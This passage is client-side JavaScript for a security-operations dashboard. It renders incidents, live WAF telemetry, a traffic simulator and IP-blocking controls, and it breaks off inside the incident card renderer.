// Aapki Nazar SOC Client Application
let currentIncidents = [];
let activeIncident = null;
let socket = null;
let currentView = "view-dashboard";
let isKanbanView = true;
let simulatorRunning = false;
let eventsInCurrentSecond = 0;

// Rolling EPS (Events Per Second) Speedometer
setInterval(() => {
  const epsVal = document.getElementById("eps-val");
  if (epsVal) epsVal.textContent = eventsInCurrentSecond;
  eventsInCurrentSecond = 0;
}, 1000);

// ── INIT ON DOM READY ──
document.addEventListener("DOMContentLoaded", async () => {
  initNavigation();
  initToolsTabs();
  initSocket();
  if (window.initCharts) window.initCharts();
  initModals();
  initPresets();
  initWafAndGateway();
  initChaosToggle();
  initKanbanDragAndDrop();
  initRulesCatalog();
  initCampaignControls();

  // Load initial data
  await refreshDashboard();
  await refreshIncidents();
  await refreshBlacklist();
  await checkSimulatorState();
  await refreshCampaignStats();
  await refreshCampaigns();
  if (window.lucide) lucide.createIcons();
});

// ── NAVIGATION CONTROLLER ──
function initNavigation() {
  const navItems = document.querySelectorAll(".nav-item[data-view]");
  navItems.forEach(item => {
    item.addEventListener("click", () => {
      const targetView = item.getAttribute("data-view");
      switchView(targetView);
    });
  });

  document.getElementById("top-sim-indicator")?.addEventListener("click", () => {
    switchView("view-traffic");
  });

  // Table vs Kanban switcher
  document.getElementById("view-kanban-toggle")?.addEventListener("click", () => {
    isKanbanView = true;
    const kanban = document.getElementById("incidents-kanban-view");
    const table = document.getElementById("incidents-table-view");
    if (kanban) kanban.style.display = "grid";
    if (table) table.style.display = "none";
    document.getElementById("view-kanban-toggle").className = "btn btn-primary btn-sm";
    document.getElementById("view-table-toggle").className = "btn btn-secondary btn-sm";
  });

  document.getElementById("view-table-toggle")?.addEventListener("click", () => {
    isKanbanView = false;
    const kanban = document.getElementById("incidents-kanban-view");
    const table = document.getElementById("incidents-table-view");
    if (kanban) kanban.style.display = "none";
    if (table) table.style.display = "block";
    document.getElementById("view-kanban-toggle").className = "btn btn-secondary btn-sm";
    document.getElementById("view-table-toggle").className = "btn btn-primary btn-sm";
  });

  // Search input
  document.getElementById("search-input")?.addEventListener("input", (e) => {
    filterIncidents(e.target.value);
  });

  // Clear stream button
  document.getElementById("clear-stream-btn")?.addEventListener("click", () => {
    const stream = document.getElementById("terminal-stream");
    if (stream) stream.innerHTML = '<div class="log-line" style="color:var(--text-muted);">[SYSTEM] Telemetry buffer cleared.</div>';
  });

  // Export CSV button
  document.getElementById("export-csv-btn")?.addEventListener("click", () => {
    window.location.href = "/incidents/export/csv";
    showToast("Exporting incident audit stream to CSV...", "info");
  });

  // Reset baseline button
  document.getElementById("reset-system-btn")?.addEventListener("click", async () => {
    const btn = document.getElementById("reset-system-btn");
    const originalHtml = btn ? btn.innerHTML : "";
    if (btn) {
      btn.disabled = true;
      btn.innerHTML = '<i data-lucide="loader" style="width:13px;height:13px;"></i> Resetting...';
      if (window.lucide) lucide.createIcons({ root: btn });
    }

    try {
      const res = await fetch("/dashboard/reset", { method: "POST" });
      if (res.ok) {
        await performFullClientReset();
        showToast("SOC baseline reset. Incidents cleared to 0, containment and simulator stopped.", "success");
      } else {
        showToast("Failed to reset baseline", "error");
      }
    } catch (err) {
      showToast(`Reset error: ${err.message}`, "error");
    } finally {
      if (btn) {
        btn.disabled = false;
        btn.innerHTML = originalHtml;
        if (window.lucide) lucide.createIcons({ root: btn });
      }
    }
  });
}

async function performFullClientReset() {
  if (window.resetCharts) window.resetCharts();

  // Reset telemetry terminal stream
  const stream = document.getElementById("terminal-stream");
  if (stream) {
    stream.innerHTML = '<div class="log-line" style="color:var(--text-muted);">[SYSTEM] Telemetry buffer cleared. Platform baseline reset.</div>';
  }

  // Reset Threat Studio
  const studioInput = document.getElementById("studio-log-input");
  if (studioInput) studioInput.value = "";
  const studioCard = document.getElementById("studio-result-card");
  if (studioCard) studioCard.style.display = "none";

  // Reset simulator client state
  simulatorRunning = false;
  applySimulatorState({ isRunning: false, config: { eps: 2, attackIntensity: 0.35, createIncidents: false }, stats: { totalGenerated: 0, detectedCount: 0 } });

  // Close open modals
  activeIncident = null;
  document.querySelectorAll(".modal-overlay").forEach(modal => {
    modal.style.display = "none";
  });

  // Zero out UI KPI statistics immediately for instant feedback
  const statActive = document.getElementById("stat-active");
  if (statActive) statActive.textContent = "0";
  const statTotalSub = document.getElementById("stat-total-sub");
  if (statTotalSub) statTotalSub.textContent = "Total tracked: 0";
  const statCritical = document.getElementById("stat-critical");
  if (statCritical) statCritical.textContent = "0";
  const statSla = document.getElementById("stat-sla");
  if (statSla) statSla.textContent = "100%";
  const statMttr = document.getElementById("stat-mttr");
  if (statMttr) statMttr.textContent = "0m";
  const statDetected = document.getElementById("stat-detected");
  if (statDetected) statDetected.textContent = "0";
  const statCrsBlocked = document.getElementById("stat-crs-blocked");
  if (statCrsBlocked) statCrsBlocked.textContent = "0";
  const statCrsSub = document.getElementById("stat-crs-sub");
  if (statCrsSub) statCrsSub.textContent = "Nginx-ModSecurity CRS v4.3 (0 total)";
  const pill = document.getElementById("active-incidents-pill");
  if (pill) pill.textContent = "0";

  // Reset MITRE matrix & EPS display
  renderMitreMatrix({});
  const epsVal = document.getElementById("eps-val");
  if (epsVal) epsVal.textContent = "0";

  // Fetch fresh empty state from backend
  await refreshDashboard();
  await refreshIncidents();
  await refreshBlacklist();
}


function switchView(viewId) {
  // Support legacy view-telemetry and sub-tool view mappings
  if (viewId === "view-telemetry") viewId = "view-traffic";
  if (viewId === "view-studio" || viewId === "view-rules" || viewId === "view-mitre") viewId = "view-tools";

  currentView = viewId;
  document.querySelectorAll(".view-panel").forEach(p => p.classList.remove("active"));
  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));

  const targetPanel = document.getElementById(viewId);
  const targetNav = document.querySelector(`.nav-item[data-view="${viewId}"]`);

  if (targetPanel) targetPanel.classList.add("active");
  if (targetNav) targetNav.classList.add("active");

  const titleMap = {
    "view-dashboard": "Executive Telemetry",
    "view-traffic": "Live Traffic Stream & Simulator",
    "view-incidents": "Incident Command Center",
    "view-campaigns": "Attack Campaigns",
    "view-tools": "Security Tools & Diagnostics"
  };

  const titleElem = document.getElementById("current-view-title");
  if (titleElem) titleElem.textContent = titleMap[viewId] || "Aapki Nazar SOC";

  if (viewId === "view-campaigns") {
    refreshCampaigns();
    refreshCampaignStats();
  }

  if (window.lucide) lucide.createIcons();
}

function initToolsTabs() {
  document.querySelectorAll(".tools-tab-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const targetTab = btn.dataset.toolTab;
      if (!targetTab) return;
      document.querySelectorAll(".tools-tab-btn").forEach(b => {
        b.classList.remove("btn-primary", "active");
        b.classList.add("btn-secondary");
      });
      btn.classList.remove("btn-secondary");
      btn.classList.add("btn-primary", "active");

      document.querySelectorAll(".tool-tab-panel").forEach(p => {
        p.style.display = "none";
        p.classList.remove("active");
      });
      const panel = document.getElementById(targetTab);
      if (panel) {
        panel.style.display = "block";
        panel.classList.add("active");
      }
      if (window.lucide) lucide.createIcons();
    });
  });
}

// ── WAF & GATEWAY CONTROLS ──
function initWafAndGateway() {
  // Top-bar inline probe
  document.getElementById("trigger-probe-btn")?.addEventListener("click", async () => {
    const select = document.getElementById("probe-vector-select");
    const vector = select ? select.value : "sqli";
    await fireWafProbe(vector);
  });

  // Official OWASP CRS Gateway Probes (Port 8080)
  document.querySelectorAll(".crs-probe-btn").forEach(btn => {
    btn.addEventListener("click", async () => {
      const vector = btn.getAttribute("data-crs-vector");
      if (vector) await fireOfficialCrsProbe(vector);
    });
  });

  // Quick probe buttons in Telemetry view (Port 3001 Custom Sensor)
  document.querySelectorAll(".quick-probe-btn").forEach(btn => {
    btn.addEventListener("click", async () => {
      const vector = btn.getAttribute("data-vector");
      if (vector) await fireWafProbe(vector);
    });
  });

  // Open Blacklist Modal
  document.getElementById("blacklist-modal-btn")?.addEventListener("click", () => {
    const modal = document.getElementById("blacklist-modal");
    if (modal) {
      modal.style.display = "flex";
      refreshBlacklist();
      if (window.lucide) lucide.createIcons();
    }
  });

  // Manual IP Blacklist Containment
  const manualIpInput = document.getElementById("manual-blacklist-ip");
  const manualIpBtn = document.getElementById("manual-blacklist-btn");
  const executeManualBlock = async () => {
    const ip = manualIpInput ? manualIpInput.value.trim() : "";
    if (!ip) {
      showToast("Please enter an IP address to contain", "warning");
      return;
    }
    try {
      const res = await fetch("/api/containment/block", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, reason: "Manual SOC operator block" })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
      showToast(`IP ${ip} contained at gateway (HTTP 403 enforced)`, "success");
      if (manualIpInput) manualIpInput.value = "";
      await refreshBlacklist();
      await refreshDashboard();
    } catch (err) {
      showToast(`Containment failed: ${err.message}`, "error");
    }
  };

  manualIpBtn?.addEventListener("click", executeManualBlock);
  manualIpInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      executeManualBlock();
    }
  });
}

async function fireWafProbe(type) {
  try {
    showToast(`Transmitting Layer-7 ${type.toUpperCase()} exploit probe...`, "info");
    const res = await fetch("/api/waf/test", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type })
    });
    const data = await res.json();

    if (data.threat) {
      showToast(`WAF Intercepted ${data.category || type.toUpperCase()} (Threat Score: ${data.threatScore}/100)`, "error");
    } else {
      showToast("Benign request passed WAF inspection (HTTP 200 OK)", "success");
    }

    await refreshDashboard();
    await refreshIncidents();
  } catch (err) {
    showToast(`Probe failed: ${err.message}`, "error");
  }
}

async function fireOfficialCrsProbe(type) {
  try {
    showToast(`Transmitting ${type.toUpperCase()} through Official CRS Gateway (Port 8080)...`, "info");
    const res = await fetch("/api/waf/crs/test", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type })
    });
    const data = await res.json();

    if (!res.ok || !data.gatewayAvailable || !data.success) {
      showToast(
        `[CRS GATEWAY OFFLINE] ${data.error || 'Cannot connect to port 8080'}. Verify Docker container is running.`,
        "error"
      );
      await refreshDashboard();
      return;
    }

    if (data.isBlocked || data.realHttpStatus === 403) {
      showToast(
        `[CRS BLOCKED] HTTP 403 Forbidden — Intercepted and rejected by Official OWASP CRS Gateway.`,
        "error"
      );
    } else if (data.realHttpStatus === 200) {
      if (data.protectedAppVerified) {
        showToast(
          `[CRS ALLOWED] HTTP 200 OK — Passed CRS inspection and fulfilled by protected demo app.`,
          "success"
        );
      } else {
        showToast(
          `[CRS WARNING] HTTP 200 received from gateway, but protected app identity unverified.`,
          "warning"
        );
      }
    } else if (data.realHttpStatus === 502) {
      showToast(
        `[GATEWAY 502] Bad Gateway — Nginx CRS proxy is running, but the protected demo app container is unreachable.`,
        "error"
      );
    } else if (data.realHttpStatus === 404) {
      showToast(
        `[HTTP 404] Not Found — Target path ${data.targetPath} not found on protected demo service.`,
        "warning"
      );
    } else {
      showToast(
        `[HTTP ${data.realHttpStatus}] ${data.statusDescription || 'Response received from gateway'}.`,
        "info"
      );
    }

    await refreshDashboard();
    await refreshIncidents();
  } catch (err) {
    showToast(`Official CRS Probe failed: ${err.message}`, "error");
  }
}

// ── REAL-TIME WEBSOCKETS (SOCKET.IO) ──
function initSocket() {
  try {
    socket = io();

    socket.on("connect", () => {
      const ind = document.getElementById("connection-indicator");
      if (ind) {
        ind.innerHTML = '<span class="live-dot"></span> CONNECTED';
        ind.className = "badge badge-low";
      }
    });

    socket.on("disconnect", () => {
      const ind = document.getElementById("connection-indicator");
      if (ind) {
        ind.innerHTML = '<span>RECONNECTING...</span>';
        ind.className = "badge badge-medium";
      }
    });

    // 1. Live Telemetry Stream Event
    socket.on("telemetry_stream", (data) => {
      eventsInCurrentSecond++;
      appendTelemetryLog(data);
      if (window.pushRealtimeData && data.stats) {
        window.pushRealtimeData(data.stats);
      }
    });

    // 2. Incident Created Event
    socket.on("incident_created", (incident) => {
      showToast(`New Incident: ${incident.title} (${incident.severity})`, incident.severity === "CRITICAL" ? "error" : "warning");
      refreshDashboard();
      refreshIncidents();
    });

    // 3. Incident Updated
    socket.on("incident_updated", () => {
      refreshDashboard();
      refreshIncidents();
    });

    // 4. Incident Deleted
    socket.on("incident_deleted", () => {
      refreshDashboard();
      refreshIncidents();
    });

    // 5. Dashboard Update
    socket.on("dashboard_update_needed", () => {
      refreshDashboard();
    });

    // 6. Gateway Blacklist Updated
    socket.on("gateway_blacklist_updated", () => {
      refreshBlacklist();
    });

    // 7. Simulator State Changed
    socket.on("simulator_state_changed", (data) => {
      applySimulatorState(data);
    });

    // 8. System Reset Broadcast
    socket.on("system_reset", async () => {
      await performFullClientReset();
      showToast("Platform baseline reset broadcast received.", "info");
    });

    // 9. Official OWASP CRS WAF Event Ingested
    socket.on("crs_waf_event", (eventData) => {
      eventsInCurrentSecond++;
      const ev = eventData?.event || eventData || {};
      const isBlocked = ev.blocked || ev.action === "BLOCKED" || ev.httpCode === 403 || ev.statusCode === 403;
      const code = ev.httpCode || ev.statusCode || (isBlocked ? 403 : 200);
      const actionLabel = isBlocked ? "BLOCKED" : (ev.action || "ALLOWED");
      const ruleText = ev.primaryRuleId 
        ? `${ev.primaryRuleId} — ${ev.primaryRuleMsg || ev.category || 'Signature Match'}` 
        : (ev.primaryRuleMsg || 'WAF Transaction Inspected');

      showToast(
        `[Official CRS ${actionLabel}] ${ruleText} (HTTP ${code})`,
        isBlocked ? "error" : (ev.anomalyScore >= 5 ? "warning" : "info")
      );
      refreshDashboard();
      refreshIncidents();
      refreshCampaigns();
      refreshCampaignStats();
    });

    // 10. Attack Campaign Created / Updated / Escalated (Phase 2)
    socket.on("campaign_created", (camp) => {
      refreshCampaigns();
      refreshCampaignStats();
    });

    socket.on("campaign_updated", (camp) => {
      refreshCampaigns();
      refreshCampaignStats();
    });

    socket.on("campaign_escalated", (data) => {
      const camp = data.campaign || data;
      showToast(
        `[CAMPAIGN ESCALATED] ${camp.correlationKey} reached ${camp.riskLevel} Risk (Score: ${camp.riskScore}/100)`,
        camp.riskLevel === "CRITICAL" ? "error" : "warning"
      );
      refreshCampaigns();
      refreshCampaignStats();
      refreshDashboard();
      refreshIncidents();
    });
  } catch (err) {
    console.warn("Socket.io not reachable, using REST polling fallback:", err);
  }
}

// ── TELEMETRY STREAM RENDERER ──
function appendTelemetryLog(data) {
  const stream = document.getElementById("terminal-stream");
  if (!stream) return;

  const logRow = document.createElement("div");
  const isMalicious = data.isThreat || data.severity === "CRITICAL" || data.severity === "HIGH" || (data.threatScore && data.threatScore >= 40);
  logRow.className = `log-line ${isMalicious ? 'log-threat' : ''}`;

  const timeStr = data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
  const geoText = data.geo ? `<span class="geo-tag" style="background:rgba(255,255,255,0.06);padding:1px 5px;border-radius:3px;font-size:10px;margin-right:4px;">${escapeHtml(data.geo.flag || '')} ${escapeHtml(data.geo.code || '')}</span> ` : "";
  const simBadge = data.isSimulated ? `<span style="background:rgba(139,92,246,0.18);color:#c4b5fd;border:1px solid rgba(139,92,246,0.3);padding:1px 5px;border-radius:3px;font-size:9.5px;font-weight:600;margin-right:6px;">SIMULATED</span>` : "";

  const actionText = isMalicious
    ? `<span class="threat-tag" style="background:#dc2626;color:#fff;padding:2px 6px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;">DETECTED: ${escapeHtml(data.threatType || data.severity || 'THREAT')} (${data.threatScore || 0}/100)</span>`
    : `<span style="color:#10b981;font-size:10px;font-weight:600;margin-left:6px;">[200 ALLOWED]</span>`;

  logRow.innerHTML = `
    <span class="log-time">[${timeStr}]</span>
    ${simBadge}
    <span class="log-ip">${geoText}${escapeHtml(data.sourceIp || data.sensor || '127.0.0.1')}</span>
    <span class="log-text" style="${isMalicious ? 'color:#f87171;' : 'color:#38bdf8;'}">${escapeHtml(data.raw || data.summary || '')}</span>
    ${actionText}
  `;

  stream.appendChild(logRow);

  // Keep max 150 items to avoid DOM memory leak
  if (stream.children.length > 150) {
    stream.removeChild(stream.children[0]);
  }

  stream.scrollTop = stream.scrollHeight;
}

// ── SYNTHETIC TRAFFIC SIMULATOR CONTROLLER ──
function initChaosToggle() {
  const simBtn = document.getElementById("sim-start-stop-btn");
  const rateSlider = document.getElementById("chaos-rate-slider");
  const rateVal = document.getElementById("chaos-rate-val");
  const attackSlider = document.getElementById("chaos-attack-slider");
  const attackVal = document.getElementById("chaos-attack-val");
  const incidentsToggle = document.getElementById("sim-incidents-toggle");
  const clearBtn = document.getElementById("clear-stream-btn");

  // Rate Slider input and change
  if (rateSlider) {
    rateSlider.addEventListener("input", (e) => {
      const eps = parseInt(e.target.value, 10);
      const ms = Math.round(1000 / eps);
      if (rateVal) rateVal.textContent = `${eps} EPS (${ms}ms)`;
    });
    rateSlider.addEventListener("change", () => {
      sendSimulatorConfig();
    });
  }

  // Attack Slider input and change
  if (attackSlider) {
    attackSlider.addEventListener("input", (e) => {
      const pct = parseInt(e.target.value, 10);
      if (attackVal) attackVal.textContent = `${pct}%`;
    });
    attackSlider.addEventListener("change", () => {
      sendSimulatorConfig();
    });
  }

  // Demonstration Incidents Toggle
  if (incidentsToggle) {
    incidentsToggle.addEventListener("change", () => {
      sendSimulatorConfig();
      if (incidentsToggle.checked) {
        showToast("Demonstration incidents enabled (rate-limited to 1 per 3s)", "info");
      }
    });
  }

  // Clear Terminal Stream
  if (clearBtn) {
    clearBtn.addEventListener("click", () => {
      const stream = document.getElementById("terminal-stream");
      if (stream) {
        stream.innerHTML = '<div class="log-line" style="color:var(--text-tertiary);">[SYSTEM] Telemetry stream cleared. Waiting for inbound traffic...</div>';
      }
    });
  }

  // Start / Stop Toggle Button
  if (simBtn) {
    simBtn.addEventListener("click", async () => {
      simBtn.disabled = true;
      try {
        if (simulatorRunning) {
          const res = await fetch("/api/simulator/stop", { method: "POST" });
          const data = await res.json();
          simulatorRunning = false;
          applySimulatorState(data);
          showToast("Traffic Simulator stopped", "info");
        } else {
          const eps = rateSlider ? parseInt(rateSlider.value, 10) : 2;
          const attackIntensity = attackSlider ? (parseInt(attackSlider.value, 10) / 100) : 0.35;
          const createIncidents = incidentsToggle ? !!incidentsToggle.checked : false;

          const res = await fetch("/api/simulator/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ eps, attackIntensity, createIncidents })
          });
          const data = await res.json();
          simulatorRunning = true;
          applySimulatorState(data);
          showToast(`Traffic Simulator running at ${eps} EPS`, "success");
        }
      } catch (err) {
        showToast(`Simulator error: ${err.message}`, "error");
      } finally {
        simBtn.disabled = false;
      }
    });
  }
}

// Live config update without restart
async function sendSimulatorConfig() {
  const rateSlider = document.getElementById("chaos-rate-slider");
  const attackSlider = document.getElementById("chaos-attack-slider");
  const incidentsToggle = document.getElementById("sim-incidents-toggle");

  const eps = rateSlider ? parseInt(rateSlider.value, 10) : 2;
  const attackIntensity = attackSlider ? (parseInt(attackSlider.value, 10) / 100) : 0.35;
  const createIncidents = incidentsToggle ? !!incidentsToggle.checked : false;

  try {
    const res = await fetch("/api/simulator/config", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ eps, attackIntensity, createIncidents })
    });
    if (res.ok) {
      const data = await res.json();
      applySimulatorState(data);
    }
  } catch (err) {
    console.warn("Failed to update simulator config:", err);
  }
}

async function checkSimulatorState() {
  try {
    const res = await fetch("/api/simulator/status");
    if (res.ok) {
      const status = await res.json();
      applySimulatorState(status);
    }
  } catch (err) {
    console.warn("Failed to check simulator state:", err);
  }
}

function applySimulatorState(state) {
  if (!state) return;
  simulatorRunning = !!state.isRunning;

  const simBtn = document.getElementById("sim-start-stop-btn");
  const statusBadge = document.getElementById("chaos-status-badge");
  const topIndicator = document.getElementById("top-sim-indicator");
  const topRate = document.getElementById("top-sim-rate");
  const measuredEps = document.getElementById("sim-measured-eps");
  const totalCount = document.getElementById("sim-stat-total");
  const detectedCount = document.getElementById("sim-stat-detected");

  // Sync button and badge
  if (simulatorRunning) {
    if (simBtn) {
      simBtn.innerHTML = '<i data-lucide="square" style="width:13px;height:13px;"></i> Stop Simulator';
      simBtn.className = "btn btn-secondary btn-sm";
      simBtn.style.padding = "6px 14px";
    }
    if (statusBadge) {
      statusBadge.textContent = "ENGINE RUNNING";
      statusBadge.className = "badge status-open";
    }
    if (topIndicator) {
      topIndicator.style.display = "inline-flex";
      if (topRate) topRate.textContent = state.config?.eps || 2;
    }
  } else {
    if (simBtn) {
      simBtn.innerHTML = '<i data-lucide="play" style="width:13px;height:13px;"></i> Start Simulator';
      simBtn.className = "btn btn-danger btn-sm";
      simBtn.style.padding = "6px 14px";
    }
    if (statusBadge) {
      statusBadge.textContent = "ENGINE IDLE";
      statusBadge.className = "badge badge-low";
    }
    if (topIndicator) {
      topIndicator.style.display = "none";
    }
  }

  // Update counters & measured EPS
  if (measuredEps) {
    const epsVal = state.currentEps !== undefined ? state.currentEps : 0;
    measuredEps.textContent = `${Number(epsVal).toFixed(1)} EPS`;
  }
  if (totalCount && state.stats) {
    totalCount.textContent = state.stats.totalGenerated || 0;
  }
  if (detectedCount && state.stats) {
    detectedCount.textContent = state.stats.detectedCount || 0;
  }

  // Sync sliders if provided and not currently being dragged
  if (state.config) {
    const rateSlider = document.getElementById("chaos-rate-slider");
    const rateVal = document.getElementById("chaos-rate-val");
    const attackSlider = document.getElementById("chaos-attack-slider");
    const attackVal = document.getElementById("chaos-attack-val");
    const incidentsToggle = document.getElementById("sim-incidents-toggle");

    if (rateSlider && document.activeElement !== rateSlider && state.config.eps !== undefined) {
      rateSlider.value = state.config.eps;
      if (rateVal) {
        const ms = Math.round(1000 / state.config.eps);
        rateVal.textContent = `${state.config.eps} EPS (${ms}ms)`;
      }
    }

    if (attackSlider && document.activeElement !== attackSlider && state.config.attackIntensity !== undefined) {
      const pct = Math.round(state.config.attackIntensity * 100);
      attackSlider.value = pct;
      if (attackVal) attackVal.textContent = `${pct}%`;
    }

    if (incidentsToggle && document.activeElement !== incidentsToggle && state.config.createIncidents !== undefined) {
      incidentsToggle.checked = !!state.config.createIncidents;
    }
  }

  if (window.lucide) lucide.createIcons();
}

// ── DASHBOARD REFRESH ──
async function refreshDashboard() {
  try {
    const res = await fetch("/dashboard");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();

    const activeCount = (data.open || 0) + (data.inProgress || 0);
    const statActive = document.getElementById("stat-active");
    if (statActive) statActive.textContent = activeCount;

    const statTotalSub = document.getElementById("stat-total-sub");
    if (statTotalSub) statTotalSub.textContent = `Total tracked: ${data.total || 0}`;

    const statCritical = document.getElementById("stat-critical");
    if (statCritical) statCritical.textContent = data.critical || 0;

    const statSla = document.getElementById("stat-sla");
    if (statSla) {
      statSla.textContent = data.total === 0 ? "100%" : (data.analytics?.slaComplianceRate !== "N/A" && data.analytics?.slaComplianceRate !== undefined ? `${data.analytics.slaComplianceRate}%` : "100%");
    }

    const statMttr = document.getElementById("stat-mttr");
    if (statMttr) {
      statMttr.textContent = data.total === 0 ? "0m" : (data.analytics?.mttrMinutes !== "N/A" && data.analytics?.mttrMinutes !== undefined ? `${data.analytics.mttrMinutes}m` : "N/A");
    }

    const statDetected = document.getElementById("stat-detected");
    if (statDetected) statDetected.textContent = data.analytics?.threatsDetected ?? (data.total || 0);

    const statCrsBlocked = document.getElementById("stat-crs-blocked");
    if (statCrsBlocked) statCrsBlocked.textContent = data.analytics?.crsBlockedCount ?? 0;

    const statCrsSub = document.getElementById("stat-crs-sub");
    if (statCrsSub) {
      const blocked = data.analytics?.crsBlockedCount ?? 0;
      const stored = data.analytics?.crsStoredAuditEvents ?? data.analytics?.crsEventsCount ?? 0;
      const gwStatus = data.analytics?.crsGatewayStatus || (data.analytics?.crsActive ? "ONLINE" : "OFFLINE");
      statCrsSub.textContent = `CRS: ${blocked} blocked / ${stored} stored logs (Gateway: ${gwStatus})`;
    }

    // Dynamic Sidebar CRS Gateway Indicator
    const crsDot = document.getElementById("sidebar-crs-dot");
    const crsTitle = document.getElementById("sidebar-crs-title");
    const crsStatusText = document.getElementById("sidebar-crs-status");
    const gwOnline = data.analytics?.crsGatewayStatus === "ONLINE" || data.analytics?.crsActive;

    if (crsDot) crsDot.style.background = gwOnline ? "#38bdf8" : "#ef4444";
    if (crsTitle) {
      crsTitle.textContent = gwOnline ? "Official OWASP CRS" : "CRS Gateway: OFFLINE";
      crsTitle.style.color = gwOnline ? "#38bdf8" : "#ef4444";
    }
    if (crsStatusText) {
      crsStatusText.textContent = gwOnline 
        ? `Gateway :8080 (Online) • OWASP_CRS/4.30.0`
        : `Gateway :8080 (Offline / Unreachable)`;
    }

    const pill = document.getElementById("active-incidents-pill");
    if (pill) pill.textContent = activeCount;

    // Health Score
    const score = data.healthScore?.score ?? 100;
    const badge = document.getElementById("health-score-badge");
    const label = document.getElementById("health-label");
    const sub = document.getElementById("health-sub");
    const iconWrap = document.getElementById("health-icon-wrap");

    if (badge) badge.textContent = `Score: ${score}/100`;

    if (score >= 85) {
      if (label) label.textContent = "Aapki Nazar Security Health Score: HEALTHY";
      if (sub) sub.textContent = "All platform services operating normally.";
      if (badge) badge.className = "badge badge-low";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-check" style="width:28px;height:28px;color:var(--status-resolved);"></i>';
    } else if (score >= 60) {
      if (label) label.textContent = "Aapki Nazar Security Health Score: ELEVATED RISK";
      if (sub) sub.textContent = "Active Layer-7 threats intercepted. Investigation underway.";
      if (badge) badge.className = "badge badge-medium";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-alert" style="width:28px;height:28px;color:var(--sev-high);"></i>';
    } else {
      if (label) label.textContent = "Aapki Nazar Security Health Score: CRITICAL THREAT DETECTED";
      if (sub) sub.textContent = "Multiple critical security alerts active. Enforcing active containment.";
      if (badge) badge.className = "badge badge-critical";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-x" style="width:28px;height:28px;color:var(--sev-crit);"></i>';
    }

    if (window.lucide && iconWrap) lucide.createIcons({ root: iconWrap });

    if (window.updateCharts) {
      window.updateCharts(data);
    }

    // Update MITRE ATT&CK Matrix Navigator
    renderMitreMatrix(data.mitreStats || {});
  } catch (err) {
    console.error("Failed to refresh dashboard:", err);
  }
}

// ── INCIDENTS CONTROLLER (KANBAN & TABLE) ──
async function refreshIncidents() {
  try {
    const res = await fetch("/incidents");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    currentIncidents = await res.json();
    renderKanban(currentIncidents);
    renderTable(currentIncidents);
  } catch (err) {
    console.error("Failed to fetch incidents:", err);
  }
}

function renderKanban(incidents) {
  const colOpen = document.getElementById("col-open");
  const colProgress = document.getElementById("col-progress");
  const colResolved = document.getElementById("col-resolved");

  if (!colOpen || !colProgress || !colResolved) return;

  colOpen.innerHTML = "";
  colProgress.innerHTML = "";
  colResolved.innerHTML = "";

  let openCount = 0;
  let progressCount = 0;
  let resolvedCount = 0;

  incidents.forEach(inc => {
    const card = createKanbanCard(inc);
    if (inc.status === "OPEN") {
      colOpen.appendChild(card);
      openCount++;
    } else if (inc.status === "IN_PROGRESS" || inc.status === "INVESTIGATING") {
      colProgress.appendChild(card);
      progressCount++;
    } else {
      colResolved.appendChild(card);
      resolvedCount++;
    }
  });

  const cntOpen = document.getElementById("cnt-col-open");
  const cntProg = document.getElementById("cnt-col-progress");
  const cntRes = document.getElementById("cnt-col-resolved");
  if (cntOpen) cntOpen.textContent = openCount;
  if (cntProg) cntProg.textContent = progressCount;
  if (cntRes) cntRes.textContent = resolvedCount;

  if (window.lucide) lucide.createIcons();
}

function getSourceBadge(inc) {
  if (inc.eventSource === "OFFICIAL_CRS" || inc.assignedTo === "OWASP-CRS-Engine") {
    return `<span class="badge badge-crs" style="font-size:9.5px;padding:1px 6px;letter-spacing:0.02em;"><i data-lucide="shield-check" style="width:10px;height:10px;display:inline;vertical-align:middle;margin-right:2px;"></i> OFFICIAL CRS</span>`;
  }
  if (inc.eventSource === "CUSTOM_WAF") {
    return `<span class="badge badge-custom-waf" style="font-size:9.5px;padding:1px 6px;letter-spacing:0.02em;"><i data-lucide="crosshair" style="width:10px;height:10px;display:inline;vertical-align:middle;margin-right:2px;"></i> CUSTOM SENSOR</span>`;
  }
  if (inc.assignedTo === "Simulator") {
    return `<span class="badge badge-simulated" style="font-size:9.5px;padding:1px 6px;letter-spacing:0.02em;"><i data-lucide="activity" style="width:10px;height:10px;display:inline;vertical-align:middle;margin-right:2px;"></i> SIMULATED</span>`;
  }
  return `<span class="badge badge-low" style="font-size:9.5px;padding:1px 6px;">MANUAL</span>`;
}

function createKanbanCard(inc) {
  const card = document.createElement("div");
  const sev = (inc.severity || "").toLowerCase();
  const sevBadge = sev === "critical" ? "badge-critical" : sev === "high" ? "badge-high" : sev === "medium" ? "badge-medium" : "badge-low";
  const sevCardClass = `sev-${sev}`;
  const criticalExtra = sev === "critical" ? " card-critical" : "";

  card.className = `kanban-card ${sevCardClass}${criticalExtra}`;
  card.setAttribute("draggable", "true");
  card.setAttribute("data-id", inc.incidentId);

  card.innerHTML = `
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:9px;">
      <div style="display:flex;align-items:center;gap:6px;">
        <span style="font-family:'JetBrains Mono',monospace;font-size:10.5px;font-weight:700;color:var(--violet-500);letter-spacing:0.04em;">${inc.incidentId}</span>
        ${getSourceBadge(inc)}
      </div>
      <span class="badge ${sevBadge}">${inc.severity}</span>
    </div>
    <div style="font-weight:600;font-size:13px;color:var(--text-primary);margin-bottom:5px;line-height:1.4;">${escapeHtml(inc.title)}</div>
